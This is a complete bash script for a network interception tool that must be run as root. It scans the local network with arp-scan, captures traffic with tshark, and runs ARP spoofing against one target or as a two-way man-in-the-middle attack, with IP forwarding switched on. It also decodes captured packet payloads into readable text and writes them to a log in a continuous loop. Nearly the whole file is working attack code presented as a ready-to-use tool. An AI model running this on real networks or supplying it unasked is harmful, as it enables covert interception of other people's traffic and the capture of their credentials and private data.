#!/usr/bin/env bash

set -euo pipefail
IFS=$'\n\t'

# --- Setup Colors and Symbols ---
setup_colors() {
  redColor="\e[0;31m"
  greenColor="\e[0;32m"
  yellowColor="\e[0;33m"
  blueColor="\e[0;34m"
  purpleColor="\e[0;35m"
  cyanColor="\e[0;36m"
  grayColor="\e[0;37m"
  resetColor=" \e[0m"

  plus="${greenColor}[+]${resetColor}"
  error="${redColor}[x]${resetColor}"
  warning="${yellowColor}[!]${resetColor}"
  question="${purpleColor}[?]${resetColor}"
  double_colon="${cyanColor}::${resetColor}"
}

print_with_color() {
  local color="$1"
  local message="$2"
  echo -e "${color}${message}${resetColor}"
}

setup_colors

print_help() {
  cat <<EOF
Usage: $0 [OPTIONS]

Options:
  -i, --interface   Network interface to capture traffic (required). Example: -i eth0
  -o, --output      Output file to save captured packets (default: output.pcap). Example: -o capture.pcap
  -f, --filter      Capture filter for TShark (optional). Example: -f "tcp.port == 80"
  -a, --analyze     Analyze the data after capture.
  -m, --mitm        Perform a Man-in-the-Middle attack. Example: -m 192.168.0.1 192.168.0.2
  -s, --scan        Scan for ARP devices on the local network.
  -l, --list        List available network interfaces.
  -x, --extract     Extract hexadecimal data in human-readable text.
  -I, --interactive Enter interactive mode for controlled captures. Example: -I -g capture.log
  -g, --log         Capture real-time traffic and save extracted data in a log. Example: -g capture.log
  -h, --help        Display this help message.
  -arp, --arp       Perform ARP spoofing for a single target. Example: -arp 192.168.0.1 192.168.0.2
  -live, --live     Display captured packets in real-time during capture. Example: -i eth0 -f "tcp" -o capture.pcap --live
  -setup, --setup   Install necessary packages for the tool.
  -debug, --debug   Enable debug mode to show additional logs.
EOF
}


setup_environment() {
  print_with_color "$double_colon" "Installing necessary packages for the tool..."
  if [ -f /etc/debian_version ]; then
    apt update && apt install -y tshark dsniff arp-scan
  elif [ -f /etc/redhat-release ]; then
    yum install -y tshark dsniff arp-scan
  elif [ -f /etc/arch-release ]; then
    pacman -Sy --noconfirm wireshark-qt dsniff arp-scan
  else
    print_with_color "$warning" "Unsupported operating system. Please install manually: tshark, dsniff, arp-scan."
    exit 1
  fi
}

validate_dependencies() {
  local dependencies=(tshark arpspoof arp-scan)
  for dep in "${dependencies[@]}"; do
    if ! command -v "$dep" >/dev/null 2>&1; then
      print_with_color "$error" "Dependency $dep is not installed. Please install it and try again."
      exit 1
    fi
  done
}

validate_arguments() {
  local interface="$1"
  if [[ -z "$interface" ]]; then
    print_with_color "\n$error" "You must specify a network interface with -i.\n"
    print_help
    exit 1
  fi
}

capture_traffic() {
  local interface=$1
  local output_file=$2
  local filter=${3:-}
  local live_mode=${4:-false}

  print_with_color "$blueColor" "Starting capture on $interface with filter: ${filter:-no filter}"

  if $live_mode; then
    tshark -i "$interface" ${filter:+-f "$filter"} -w "$output_file" -x || {
      print_with_color "$error" "Error capturing traffic in live mode."
      exit 1
    }
  else
    tshark -i "$interface" ${filter:+-f "$filter"} -w "$output_file" || {
      print_with_color "$error" "Error capturing traffic."
      exit 1
    }
  fi
}

capture_and_log() {
  local interface=$1
  local log_file=$2
  local output_file="$log_file.pcap"

  print_with_color "$greenColor" "Starting capture on interface $interface."
  while true; do
    tshark -i "$interface" -a duration:5 -w "$output_file" >/dev/null 2>&1 || {
      print_with_color "$error" "Error creating temporary capture file."
      exit 1
    }

    print_with_color "$greenColor" "Extracting data from pcap file..."
    echo -e "\n--- Capture started at $(date '+%Y-%m-%d %H:%M:%S') ---\n" >>"$log_file"
    tshark -r "$output_file" -T fields -e data | while read -r line; do
      [ -n "$line" ] && echo "$line" | xxd -r -p >>"$log_file"
    done
    echo -e "\n--- Capture ended at $(date '+%Y-%m-%d %H:%M:%S') ---\n" >>"$log_file"

    print_with_color "$greenColor" "Data added to log: $log_file."
    [[ $AUTO_MODE != true ]] && {
      print_with_color "$cyanColor" "Press Enter to continue or Ctrl+C to exit."
      read -r
    }
  done
}

run_arpspoof() {
  local interface="$1"
  local target="$2"
  local victim="$3"

  print_with_color "$double_colon" "Starting ARP spoofing: Target=$target, Victim=$victim"
  arpspoof -i "$interface" -t "$target" "$victim" &
}

arpspoof_mitm() {
  local interface=$1
  local target1=$2
  local target2=$3

  print_with_color "$double_colon" "Starting MITM between $target1 and $target2 on $interface."
  echo 1 >/proc/sys/net/ipv4/ip_forward
  run_arpspoof "$interface" "$target1" "$target2"
  run_arpspoof "$interface" "$target2" "$target1"
  trap handle_interrupt SIGINT
  wait
}

scan_network() {
  local interface=$1
  print_with_color "$double_colon" "Scanning devices on the network..."
  arp-scan --interface "$interface" --localnet
}

list_interfaces() {
  print_with_color "$double_colon" "Available network interfaces:"
  ip -o link show | awk -F': ' '{print $2}' | grep -v "lo"
}

analyze_traffic() {
  local pcap_file=$1
  if [ ! -s "$pcap_file" ]; then
    print_with_color "$error" "Error: Empty or nonexistent file."
    exit 1
  fi
  tshark -r "$pcap_file" -T text
}

handle_interrupt() {
  print_with_color "$warning" "Interrupt detected. Cleaning up..."
  pkill -f arpspoof || true
  echo 0 >/proc/sys/net/ipv4/ip_forward
  exit 0
}

extract_pcap() {
  local file=$1
  if [ ! -f "$file" ]; then
    print_with_color "$error" "Error: The pcap file does not exist."
    exit 1
  fi

  tshark -r "$file" -Y "frame.len > 100" -T fields -e data | while read -r line; do
    [ -n "$line" ] && echo "$line" | xxd -r -p
  done
}


check_arguments(){
	    if [[ $# -le 2 ]]; then
        print_with_color "\n$error" "Statement incomplete.\n"
        print_help
        exit 1
        fi
}

main() {
  if [ "$(id -u)" -ne 0 ]; then
    print_with_color "$error" "This script must be run as root."
    exit 1
  fi

  local interface=""
  local output_file="output.pcap"
  local filter=""
  local analyze=false
  local mitm=false
  local scan=false
  local target1=""
  local target2=""
  local arpspoof=false
  local debug_mode=false
  local live_mode=false

  while [[ $# -gt 0 ]]; do
    case $1 in
      -i|--interface)
      	check_arguments "$@"
        interface=$2
        shift 2
        ;;
      -o|--output)
      	check_arguments "$@"
        output_file=$2
        shift 2
        ;;
      -f|--filter)
      	check_arguments "$@"
        filter=$2
        shift 2
        ;;
      -debug|--debug)
        debug_mode=true
        shift
        ;;
      -a|--analyze)
        analyze=true
        shift
        ;;
      -m|--mitm)
      	check_arguments "$@"
        target1=$2
        target2=$3
        mitm=true
        shift 3
        ;;
      -arp|--arp)
      	check_arguments "$@"
        target1=$2
        target2=$3
        arpspoof=true
        shift 3
        ;;
      -s|--scan)
        scan=true
        shift
        ;;
      -setup|--setup)
        setup_environment
        exit 0
        ;;
      -l|--list)
        list_interfaces
        exit 0
        ;;
      -x|--extract)
        extract_pcap $2
        exit 0
        ;;
      -g|--log)
      	check_arguments "$@"
        log_file=$2
        capture_and_log "$interface" "$log_file"
        exit 0
        ;;
      -live|--live)
        live_mode=true
        shift
        ;;
      -h|--help)
        print_help
        exit 0
        ;;
      *)
        print_with_color "$warning" "Unknown option: $1"
        print_help
        exit 1
        ;;
    esac
  done

  validate_dependencies
  validate_arguments "$interface"

  if $debug_mode; then
    set -x
  fi

  if $scan; then
    scan_network "$interface"
  elif $mitm; then
    arpspoof_mitm "$interface" "$target1" "$target2"
  elif $arpspoof; then
    run_arpspoof "$interface" "$target1" "$target2"
  else
    capture_traffic "$interface" "$output_file" "$filter" "$live_mode"
    $analyze && analyze_traffic "$output_file"
  fi
}

main "$@"
